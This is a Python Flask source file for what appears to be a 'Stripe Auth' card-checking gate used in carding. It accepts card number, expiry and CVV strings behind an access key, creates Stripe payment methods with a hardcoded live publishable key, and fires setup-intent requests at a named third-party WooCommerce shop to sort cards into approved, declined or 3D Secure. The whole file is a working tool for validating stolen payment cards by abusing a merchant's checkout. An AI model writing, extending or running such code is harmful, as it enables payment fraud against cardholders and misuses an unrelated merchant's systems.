from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

@app.route("/")
def stripe_auth():
    ccx = request.args.get("cc")
    gate = request.args.get("gate")
    key = request.args.get("key")

    if not ccx or not gate or not key:
        return jsonify({
            "status": "error",
            "message": "Missing parameters. Use: ?gate=stripe3&key=your_key&cc=NUMBER|MM|YY|CVV"
        })

    if gate != "stripe3" or key != "darkwaslost":
        return jsonify({"status": "error", "message": "Invalid gate or key"})

    return jsonify(process_card(ccx))


def process_card(ccx):
    ccx = ccx.strip()
    try:
        number, mm, yy, cvv = ccx.split("|")
    except ValueError:
        return {"cc": ccx, "gate": "Stripe Auth", "status": "❌ Declined", "response": "Invalid format"}

    if "20" in yy:
        yy = yy.split("20")[1]

    payment_headers = {
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'user-agent': 'Mozilla/5.0',
    }

    payment_data = {
        'type': 'card',
        'card[number]': number,
        'card[cvc]': cvv,
        'card[exp_year]': yy,
        'card[exp_month]': mm,
        'billing_details[address][country]': 'IN',
        'key': 'pk_live_84ECRSGzy9LtHCLoLxRVU1E5',
        '_stripe_version': '2024-06-20'
    }

    try:
        r = requests.post("https://api.stripe.com/v1/payment_methods", headers=payment_headers, data=payment_data)
        rj = r.json()
        if 'id' not in rj:
            return {"cc": ccx, "gate": "Stripe Auth", "status": "❌ Declined", "response": rj.get("error", {}).get("message", "PM Failed")}
        pmid = rj['id']
    except Exception as e:
        return {"cc": ccx, "gate": "Stripe Auth", "status": "❌ Declined", "response": f"PM Error: {e}"}

    setup_headers = {
        'accept': '*/*',
        'content-type': 'application/x-www-form-urlencoded',
        'user-agent': 'Mozilla/5.0',
    }

    setup_data = {
        'action': 'create_and_confirm_setup_intent',
        'wc-stripe-payment-method': pmid,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': 'demo_nonce'
    }

    try:
        response = requests.post(
            "https://shop.us.maisoncommon.com/en/",
            params={'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'},
            headers=setup_headers,
            data=setup_data
        )
        try:
            rj = response.json()
        except:
            return {"cc": ccx, "gate": "Stripe Auth", "status": "⚠️ Unknown", "response": response.text[:150]}

        if rj.get("success") is True:
            status = rj.get("data", {}).get("status", "")
            if status == "succeeded":
                return {"cc": ccx, "gate": "Stripe Auth", "status": "✅ Approved", "response": status}
            elif status == "requires_action":
                return {"cc": ccx, "gate": "Stripe Auth", "status": "⚠️ 3D Secure Required", "response": status}
            elif status == "requires_payment_method":
                return {"cc": ccx, "gate": "Stripe Auth", "status": "❌ Declined", "response": status}
            else:
                return {"cc": ccx, "gate": "Stripe Auth", "status": "⚠️ Unknown", "response": status}
        else:
            return {"cc": ccx, "gate": "Stripe Auth", "status": "❌ Declined", "response": rj.get("message", "Unknown error")}
    except Exception as e:
        return {"cc": ccx, "gate": "Stripe Auth", "status": "❌ Declined", "response": f"Setup Error: {e}"}


if __name__ == "__main__":
    app.run()
